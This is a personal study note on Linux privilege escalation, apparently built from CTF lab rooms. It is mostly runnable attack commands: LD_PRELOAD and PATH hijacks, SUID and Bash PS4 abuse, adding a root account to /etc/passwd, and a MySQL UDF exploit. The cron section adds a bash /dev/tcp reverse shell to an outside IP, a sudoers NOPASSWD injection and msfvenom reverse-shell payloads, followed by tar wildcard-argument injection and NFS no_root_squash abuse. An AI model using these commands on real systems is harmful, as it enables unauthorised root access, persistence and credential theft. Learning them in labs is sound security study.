---
{"dg-publish":true,"permalink":"/notes/escalating-privileges/","dgShowToc":"false"}
---

 Important
- Reset passwords
- Bypass access controls to compromise protected data
- Edit software configurations
- Enable persistence, so you can access the machine again later.
- Change privilege of users
- Execute any administrative command
- Get that cheeky root flag ;)
![Pasted image 20240607184831.png|500](/img/user/attachments/Pasted%20image%2020240607184831.png)
# Linux privesc

## Sudo -l
```bash
sudo -l
```

to check another user
```shell
sudo -l -U tracy
```

Execute a file like the owner
```shell
sudo -u USERNAME ./script.sh
```

Login as `root`
```shell
sudo su
```
### Shell Escape Sequences
- [https://gtfobins.github.io/](https://gtfobins.github.io/)
- [[sudo -l\|sudo -l]]
### Leverage application functions
- Some applications will not have a known exploit within this context.
- we can use a "hack" to leak information **leveraging a function of the application.**

Example: Apache2 ant the `-f` parameter used to load the `/etc/shadow`, this will result in an error message that includes the first line of the `/etc/shadow` file.
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### sudo Environment Variables

</div>


- Sudo can be configured to **inherit** certain environment **variables from the user**'s environment.
- Check which environment variables are inherited (look for the env_keep options):
```shell
sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
- LD_PRELOAD and LD_LIBRARY_PATH are both **inherited from the user's environment**.
- LD_PRELOAD loads a shared object before any others when a program is run.
- LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
### LD_PRELOAD
- Create a shared object using the code located at /home/user/tools/sudo/[[preload.c\|preload.c]]:
```shell
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
- Run one program (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
- A root shell should spawn.
```shell
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
### LD_LIBRARY_PATH
Run ldd against the apache2 program file to see which shared libraries are used by the program:
```shell
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/[[library_path.c\|library_path.c]]:
```shell
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp
```shell
sudo LD_LIBRARY_PATH=/tmp apache2
```

</div></div>

## SUID-SGID executable scaling
- https://gtfobins.github.io/
- [[SUID\|SUID]] [[SGID\|SGID]]
Check files with [[SUID\|SUID]] or [[SGID\|SGID]] permission
```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Check files with [[SUID\|SUID]] permission
```shell
find / -type f -perm -u=s -ls 2>/dev/null
```
```shell
find / -type f -perm -4000 -ls 2>/dev/null
```
Check files with [[SGID\|SGID]] permission
```shell
find / -perm -g=s -type f -ls 2>/dev/null
```
```shell
find / -type f -perm -2000 -ls 2>/dev/null
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Escataling with known exploits

</div>


- Find a known exploit. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!

| exim-4.84-3 | [[CVE-2016-1531.sh\|CVE-2016-1531.sh]] |
| ----------- | -------------------- |


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scaling Shared Object injection

</div>


- If we have a executable
- Search if is trying to load shared objects, but it cannot be found.
```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
  ```

- like this
`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`

- Create the **.config** directory for the libcalc.so file:
```sh
mkdir /home/user/.config
```
- **Compile** the code [[libcalc.c\|libcalc.c]] (It **simply spawns a Bash shell.**) into a shared object at the location the **suid-so** executable was looking for it:
```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
- Run again
`/usr/local/bin/suid-so`

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### SUID exploit enviroment var

</div>


- If an executable can be exploited due to it inheriting the user's PATH and attempting to execute programs **without specifying an absolute path**.

Example
The executable is trying to start an `apache2` webserver
Use `strings` to look for string in the file.
```shell
strings /usr/local/bin/suid-env
```
One line ("`service apache2 start`") suggests that the `service` executable is being called to start the webserver, however **the full path** of the executable (`/usr/sbin/service`) **is not being used**.
Two options:
1. Compile the code (spawn a bash shell) [[service.c\|service.c]] into an executable.
```shell
gcc -o service /home/user/tools/suid/service.c
```
2. Or like an e.g. copy the shell file as an executable (`service` in this case)
```shell
echo /bin/bash > file_to_execute
```
Change the PATH [[PATH exploiting\|PATH exploiting]]
```shell
export PATH=/path_to_executable:$PATH
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scaling Abusing shell

</div>


## Bash versions below `4.2-048`
- Define shell **functions** with **names** that **resemble** file paths
- then **export** those functions so that they are used **instead** of any actual **executable** at that file **path**.
- If we have an executable `strings /usr/local/bin/suid-env2`
`strings /usr/local/bin/suid-env2`
`/usr/sbin/service apache2 start`
- Create a Bash function with the name `usr/sbin/service` that executes a new Bash shell (using -p so permissions are preserved)
```shell
function /usr/sbin/service { /bin/bash -p; }
```
- export the function:
```shell
export -f /usr/sbin/service
```
- Run the executable
## Bash versions below `4.4`
-  If we have an executable 
- In debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
- Run the executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```shell
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
- Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```shell
/tmp/rootbash -p
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Python SUID

</div>


set to root
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami")'
```

set to root and open a bash 
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami"); os.system("bash")'
```

Option to show the results
```python
import os; print(os.popen("ls -l").read())
```

subproccess.run([comando])

with sys module too

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Capabilities

</div>


## Ver y cambiar capabilities
Como /usr está en modo lectura es necesario montarlo como escritura para poder editar las capabilities de este.
```shell
mount -o remount, rw /usr
setcap cap_net_admin,cap_net_raw+eip /usr/bin/wireshark
```

| Option                       | Description                          |
| ---------------------------- | ------------------------------------ |
| `getcap file`                | List capabilities simple             |
| `getcap -r / 2>/dev/null`    | List capabilities recursive from `/` |
| `setcap cap_setupid+ep file` | change                               |
| `setcap -r file`             | Remove                               |
## Lista de capabilities

Hasta la versión 2.4.18 de Linux, las siguientes capacidades están implementadas:

| Capability           | Description                                                                                                                                                                                                                                                                                                                                                                                                                              |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CAP_SETUID           | Permite  manipulaciones arbitrarias de los IDs de usuario de los procesos (setuid(2), etc.); permite el uso  de  IDs  de  usuario falsificados cuando se pasan credenciales de conectores a través de conectores de dominio Unix.                                                                                                                                                                                                        |
| CAP_SETGID           | Permite  manipulaciones arbitrarias de los IDs de grupo y de la lista de IDs de grupo adicionales de un proceso; permite el  uso de  IDs  de  grupo  falsificados cuando se pasan credenciales de conectores a través de conectores de dominio Unix.                                                                                                                                                                                     |
| CAP_CHOWN            | Permite cambios arbitrarios en los IDs de usuario y de grupo de los ficheros (vea chown(2)).                                                                                                                                                                                                                                                                                                                                             |
| CAP_DAC_OVERRIDE     | Evita  las  comprobaciones de permisos sobre operaciones de lectura, escritura y ejecución.  (DAC = "control de acceso  discre-cional".)                                                                                                                                                                                                                                                                                                 |
| CAP_DAC_READ_SEARCH  | Evita comprobaciones de permisos sobre operaciones de lectura de ficheros y lectura y ejecución de directorios.                                                                                                                                                                                                                                                                                                                          |
| CAP_FOWNER           | Evita comprobaciones de permisos sobre operaciones  que  normalmente requieren que el ID de usuario del sistema de ficheros del proceso coincida  con  el  ID  de  usuario  del  fichero  (p.e., utime(2)),   excluyendo   aquellas   operaciones  cubiertas  por CAP_DAC_OVERRIDE y CAP_DAC_READ_SEARCH; ignora el  bit  pegajoso (sticky) en el borrado de ficheros.                                                                   |
| CAP_FSETID           | No  borra los bits set-user-ID y set-group-ID cuando se modifica un fichero; permite  establecer  el  bit  set-group-ID  para  un fichero  cuyo  ID  de  grupo  no  coincide con el del sistema de ficheros o cualquier otro ID  de  grupo  adicional  del  proceso invocador.                                                                                                                                                           |
| CAP_IPC_LOCK         | Permite  el  bloqueo  en  memoria  (mlock(2),  mlockall(2), shm-ctl(2)).                                                                                                                                                                                                                                                                                                                                                                 |
| CAP_IPC_OWNER        | Evita comprobaciones de  permisos  para  las  operaciones  sobre objetos System V IPC.                                                                                                                                                                                                                                                                                                                                                   |
| CAP_KILL             | Evita  comprobaciones  de  permisos  para  enviar  señales  (vea kill(2)).                                                                                                                                                                                                                                                                                                                                                               |
| CAP_LEASE            | (Linux 2.4 en adelante)  Permite que  se  establezcan  arriendos sobre ficheros arbitrarios (vea fcntl(2)).                                                                                                                                                                                                                                                                                                                              |
| CAP_LINUX_IMMUTABLE  | Permite  establecer  los  atributos  extendidos EXT2_APPEND_FL y EXT2_IMMUTABLE_FL sobre ficheros del sistema de ficheros ext2.                                                                                                                                                                                                                                                                                                          |
| CAP_MKNOD            | (Linux 2.4 en adelante) Permite la creación  de  ficheros  especiales usando mknod(2).                                                                                                                                                                                                                                                                                                                                                   |
| CAP_NET_ADMIN        | Permite   varias   operaciones  relacionadas  con  redes  (p.e., establecer opciones privilegiadas sobre conectores, habilitar la difusión  de paquetes multidestino (multicasting), configuración de interfaces, modificar tablas de encaminamiento).                                                                                                                                                                                   |
| CAP_NET_BIND_SERVICE | Permite ligar conectores a puertos  reservados  del  dominio  de Internet (números de puerto menores que 1024).                                                                                                                                                                                                                                                                                                                          |
| CAP_NET_BROADCAST    | (No  se  usa)  Permite  la  difusión universal (broadcasting) de paquetes a través de un conector y la escucha de paquetes multidestino.                                                                                                                                                                                                                                                                                                 |
| CAP_NET_RAW          | Permite el uso de conectores de tipo RAW y PACKET.                                                                                                                                                                                                                                                                                                                                                                                       |
| CAP_SETPCAP          | Concede o elimina cualquier capacidad en el conjunto de  capacidades permitidas del invocador a o desde cualquier otro proceso.                                                                                                                                                                                                                                                                                                          |
| CAP_SYS_ADMIN        | Permite una variedad de operaciones de administración  del  sistema  incluyendo:  quotactl(2),  mount(2),  swapon(2),  sethostname(2), setdomainname(2), IPC_SET y operaciones IPC_RMID  sobre objetos  arbitrarios  IPC  de System V; permite el uso de IDs de usuario falsificados cuando se pasan credenciales de conectores.                                                                                                         |
| CAP_SYS_BOOT         | Permite llamadas a reboot(2).                                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_CHROOT       | Permite llamadas a chroot(2).                                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_MODULE       | Permite cargar y eliminar módulos del núcleo.                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_NICE         | Permite aumentar el valor nice del proceso  invocador  (nice(2), setpriority(2)) y cambiar el valor nice de procesos arbitrarios; permite establecer políticas de  planificación  de  tiempo  real para  el  proceso  invocador  y establecer políticas de planificación y prioridades para procesos arbitrarios  (sched_setscheduler(2), sched_setparam(2)).                                                                            |
| CAP_SYS_PACCT        | Permite llamadas a acct(2).                                                                                                                                                                                                                                                                                                                                                                                                              |
| CAP_SYS_PTRACE       | Permite  el seguimiento detallado de procesos arbitrarios usando ptrace(2)                                                                                                                                                                                                                                                                                                                                                               |
| CAP_SYS_RAWIO        | Permite operaciones sobre puertos de E/S (iopl(2) y ioperm(2)).                                                                                                                                                                                                                                                                                                                                                                          |
| CAP_SYS_RESOURCE     | Permite el uso de espacio  reservado  en  sistemas  de  ficheros ext2;  llamadas  ioctl(2)  para  controlar  el registro en ext3; sobrescribir los límites de las cuotas de disco; incrementar los límites  de  recursos (vea setrlimit(2)); sobrescribir el límite del recurso RLIMIT_NPROC; incrementar el límite msg_qbytes para una  cola  de  mensajes  por encima del limite en /proc/sys/kernel/msgmnb (vea msgop(2) y msgctl(2). |
| CAP_SYS_TIME         | Permite la modificación del reloj del sistema  (settimeofday(2), adjtimex(2));  permite  la modificación del reloj de tiempo real (hardware)                                                                                                                                                                                                                                                                                             |
| CAP_SYS_TTY_CONFIG   | Permite llamadas a vhangup(2).                                                                                                                                                                                                                                                                                                                                                                                                           |


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## PATH exploiting

</div>


- If we have [[SUID\|SUID]] binary
- Re-write the PATH variable to a location of our choosing!
- When the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

Example with `ls`

```shell
cd /tmp && \
echo "[whatever command we want to run]" > [name of the executable we are imitating]
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
```

Check which folders can I write.

</div></div>

## Weak file permissions
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Writable passwd

</div>


### Create a new user
- write a new line entry create a new user!
- Add the password hash of our choice, and set the UID, GID and shell to root.

```shell
openssl passwd -1 -salt [salt] [password]
```

```
new_user:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

```shell
echo 'new_user:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## Replace the hash of root
Generate password (Automatic salt)
```shell
openssl passwd [password]
```

Edit the `/etc/passwd` file and place the generated password hash between the first and second colon (:) of the root user's row **(replacing the "x").**

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Readable shadow - cracking hashes

</div>


- The /etc/shadow file is the file on Linux machines where password hashes are stored.
- It also stores other information, such as the date of last password change and password expiration information
# unshadow

John can be very particular about the formats it needs data in to be able to work with it.
you must **combine** it with the /etc/passwd file

``` bash
unshadow [path to passwd] [path to shadow]
```

``` bash
unshadow local_passwd local_shadow > unshadowed.txt
```

use just the relevant line

local_passwd  
Contains the /etc/passwd line for the root user:
local_shadow
Contains the /etc/shadow line for the root user:
# cracking
in some cases you will need to specify the format as we have done previously using: `--format=sha512crypt`

``` bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
```



</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Writeable shadow

</div>


Generate a new password hash with a password of your choice:
```shell
mkpasswd -m sha-512 newpasswordhere
```

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

	su root

</div></div>

## [[Cron job\|Cron job]] exploiting
Look for jobs, and try to exploit them
### Look for text on [[Cron job\|Cron job]]
Using [[grep\|grep]]
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Cron exploit - File permissions

</div>


Check permissions of the scripts

Options:
1. Get a **reverse shell**, send a bash
```shell
echo 'bash -i>&/dev/tcp/10.13.51.143/4747 0>&1' >> /script.sh
```


2. Give the `sudoers` **permissions** to the current user
```shell
printf '#!/bin/bash\necho "CURRENT_USER ALL=NOPASSWD:ALL" >> /etc/sudoers' > /script.sh
```

3. Create a **copy** of the root **bash file** and set [[SUID\|SUID]] bit
   Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
   `/tmp/rootbash -p`
   The `script.sh`:
```shell
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
``` 
   

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Cron exploit - PATH

</div>


- check the crontabs
- If a script exist with no direct path like
`* * * * * root overwrite.sh`
- We can check if we have permissions to create an imitate script in some dir of the PATH
`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
- If it's possible, create a script and make exec,



</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Cron exploit - Wildcards

</div>


- Check the scripts with tar, 7z, rsync, etc.
- Search a `*` like
```shell
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
- GTFOBins, Note that tar has command line options that let you **run** other **commands** as part of a checkpoint feature.
- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
- Put it to `/home/user`
- Make it executable:
`chmod +x /home/user/shell.elf`
- Create these two files in /home/user:
Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
```sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
- Listen on attacker machine and wait for a [[Cron job\|Cron job]] run

</div></div>

## Writable scripts invoked by root

### Look for scripts with root permisions
```sh
find / -name *.sh 2>/dev/null | xargs ls -l
```

```shell
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

if a file is found, in temp create a script and exec the code
```sh
#!/bin/bash
	while true; do
		echo 'chmos u+s >> /tmpa.bash'
	done
```
## Passwords & keys
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Check history files

</div>


- Check If a user accidentally types their password
```shell
history
```
```shell
cat ~/.*history | less
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Check config files

</div>


- Config files often contain passwords in plaintext or other reversible formats.
- Check what plaintext files is loading some files
```shell
ls /home/user
cat /home/user/myvpn.ovpn
```


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



[[LFI-WordList-Linux\|LFI-WordList-Linux]]

| **Location**                  | **Description**                                                                                                                                                   |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/etc/issue`                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| `/etc/profile`                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| `/proc/version`               | specifies the version of the Linux kernel                                                                                                                         |
| `/etc/passwd`                 | has all registered user that has access to a system                                                                                                               |
| `/etc/shadow`                 | contains information about the system's users' passwords                                                                                                          |
| `/root/.bash_history`         | contains the history commands for root user                                                                                                                       |
| `/var/log/dmessage`           | contains global system messages, including the messages that are logged during system startup                                                                     |
| `/var/mail/root`              | all emails for root user                                                                                                                                          |
| `/root/.ssh/id_rsa`           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| `/var/log/apache2/access.log` | the accessed requests for Apache  webserver                                                                                                                       |


</div></div>


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Check SSH keys

</div>


- Sometimes **users make backups** of important files but **fail** to secure them **with** the correct **permissions**.
- Search `.ssh` folder
- In this example, file called **root_key**

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Weak-reused-plaintext passwords

</div>


- Check file where webserver connect to database (`config.php` or similar)
- Check databases for admin passwords that might be reused
- Check weak passwords

```shell
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext password

```shell
# Anything interesting the the mail?
/var/spool/mail
```

```shell
./LinEnum.sh -t -k password
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## NFS

</div>


- Network File Sharing
- Protocol to get the user **remote access**
- File admin
- Allows a system to **share directories and files** with others over a network.
- Users and programs can access files on remote systems almost as if they were local files.
- It does this by mounting all, or a portion of a file system on a server.
- The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.
- First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device.
- The mount service will then act to connect to the relevant mount daemon using RPC.
The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

-  The file handle
-  The name of the file to be accessed
-  The user's, user ID
-  The user's group ID

Transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

## Enumeration
- Configuration is kept in the `/etc/exports` file.
- NFS-Common, It is important to have this package installed on any machine that uses NFS.
```sh
sudo apt install nfs-common
```
### List NFS visible shares
```shell
showmount -e [IP]
```

### Mounting NFS shares
- Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. 
- You can create this folder anywhere on your system. 
- Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:

```sh
sudo mount -t nfs IP:share /tmp/mount/ -nolock
```

| **Tag** | **Function** |
| ---- | ---- |
| sudo | Run as root |
| mount | Execute the mount command |
| -t nfs | Type of device to mount, then specifying that it's NFS |
| IP:share | The IP Address of the NFS server, and the name of the share we wish to mount (of the list NFS above) |
| -nolock | Specifies not to use NLM locking |
### Get info
```sh
rpcinfo -p 10.0.0.0
```

- Tools
RPSCan
SuperEnum
## Exploitation
- If  you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.
### root_squash
- By **default**, on NFS shares- **Root Squash**ing is **enabled**, and **prevents** anyone connecting to the NFS share from having **root access** to the NFS volume.
- Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges.
- Not what we want. However, **if this is turned off**, it can allow the creation of [[SUID\|SUID]] bit files, allowing a remote user root access to the connected system.
### Check root_squash
On the target machine check which file systems are exporting to remote hosts.
```shell
cat /etc/exports
```
Check if any share has root squashing disabled like:
`/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`
### Method 1 -  Copy Bash file
- We're **able** to **upload files** to the NFS share, and control the permissions of these files.
- **We can set the permissions** of whatever we upload, in this case a **bash** shell executable.
- We can then log in through SSH and execute this executable to gain a root shell!
1. NFS Access
   Mount if `/tmp` has `no_root_squash`
```shell
mount 192.168.1.101:/ /tmp/
mount -o rw,vers=3 VICTIM_IP:/tmp /tmp/nfs
```
2. Gain Low Privilege Shell
3. Download and put the victim bash file to the NFS share
   `scp victimname@VICTIM_IP:/bin/bash /tmp/nfs`
4. Set SUID Permissions Through NFS Due To Misconfigured Root Squash
   ```shell
   sudo chown root bashfile
   sudo chmod +s bashfile
   ```
5. Login through SSH
6. Execute SUID Bit Bash Executable (On the victim machine)
   ```shell
   ./bash -p
   ```
   The `-p` persists the permissions, so that it can run as root with SUID as otherwise bash will sometimes drop the permissions.
7. ROOT ACCESS
### Method 2 - Create Executable file
```shell
# First check if the target machine has any NFS shares
showmount -e 192.168.1.101
```
If it does, then mount it to your filesystem
Log as **root** and mount.
Mount if `/tmp` has `no_root_squash`
```shell
mount 192.168.1.101:/ /tmp/
mount -o rw,vers=3 VICTIM_IP:/tmp /tmp/nfs
```
If that succeeds, go to `/tmp/share` or `/tmp/nfs`
There might be some interesting stuff there.
But even if there isn't you might be able to exploit it.
- **Test** if you can **create files**, then check with your low-priv shell **what user** has **created** that file.
- **If it root**, **create** a [[exploit_file_NFS\|exploit_file_NFS]] **or** generate a payload using **msfvenom**
```shell
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
- save it to the mounted share or compile it with [[gcc\|gcc]] (On the victim machine if it's possible to avoid compatibility issues) to get the executable
- set it with **[[SUID\|SUID]]**-permission from your attacking machine.
```shell
chmod 4777 exploit_file
chmod +xs exploit_file
```
 - And then **execute it** with your low privilege shell on the victim machine.

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## User Installed Software

</div>


- some third party software that might be vulnerable?. If you find anything google it for exploits.
```shell
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- service is running as root and the "root" user for the service does not have a password assigned
- take advantage of [[UDF\|UDF]] to run system commands as root via the MySQL service.
- https://www.exploit-db.com/exploits/1518
Compile
```shell
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect

	mysql -u root

Create a [[UDF\|UDF]]  "do_system" using our compiled exploit:
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

	select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

	/tmp/rootbash -p

**Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!**

	rm /tmp/rootbash   exit

</div></div>


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Wildcard spare

</div>


https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
## chown, chmod

You can **indicate which file owner and permissions you want to copy for the rest of the files**

```
touch "--reference=/my/own/path/filename"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Execute arbitrary commands:**

```
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Execute arbitrary commands:**

```
Interesting rsync option from manual:

 -e, --rsh=COMMAND           specify the remote shell to use
     --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```
touch "-e sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** even using `--` before `*` (note that `--` means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:

```
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```

And you can create files in the folder were this is being executed, you could create the file `@root.txt` and the file `root.txt` being a **symlink** to the file you want to read:

```
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

Then, when **7z** is execute, it will treat `root.txt` as a file containing the list of files it should compress (thats what the existence of `@root.txt` indicates) and when it 7z read `root.txt` it will read `/file/you/want/to/read` and **as the content of this file isn't a list of files, it will throw and error** showing the content.

_More info in Write-ups of the box CTF from HackTheBox._

## Zip

**Execute arbitrary commands:**

```
zip name.zip files -T --unzip-command "sh -c whoami"
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Service only available from inside

</div>


- It might be the user is running some service that is only available from that host.
- You **can't** connect to the service from the **outside**.
- It might be a development **server**, a **database**, or anything else.
- These services **might** be running as **root**, or they might have **vulnerabilities** in them.

Check the netstat and compare it with the nmap-scan you did from the outside.

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships

| Option                                               | Description                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------- |
| `netstat -lanp`<br>`netstat -antp`<br>`netstat -ano` | Common use                                                        |
| `netstat -at` <br>`netstat -au`                      | List [[TCP\|TCP]] or [[UDP\|UDP]] protocols respectively.                   |
| `netstat -anlp \| grep -iE "tcp.*LISTEN"`            | Filtering `tcp`  and `listen`                                     |
| `-a`                                                 | Display all sockets                                               |
| `-n`                                                 | Do not resolve names                                              |
| `-o`                                                 | Display timers                                                    |
| `-p`                                                 | Display PID/Program name for sockets                              |
| `-l`                                                 | List ports in “**listening**” mode.<br>Use with `t` or `u`        |
| `-s`                                                 | List network usage statistics by protocol.<br>Use with `t` or `u` |
| `-i`                                                 | Shows interface statistics.                                       |



</div></div>


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Unmounted filesystems

</div>


- looking for any unmounted filesystems.
- If we find one we mount it and start the priv-esc process over again.

```
mount -l
cat /etc/fstab
```

</div></div>

## Kernel and distribution exploits
- Tipically exploit target vulnerabilities to execute code or 
- Kernel exploits can leave the system in an **unstable state**
- Only run them as a **last resort.**
- Try search on https://www.linuxkernelcves.com/cves
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### LES

</div>


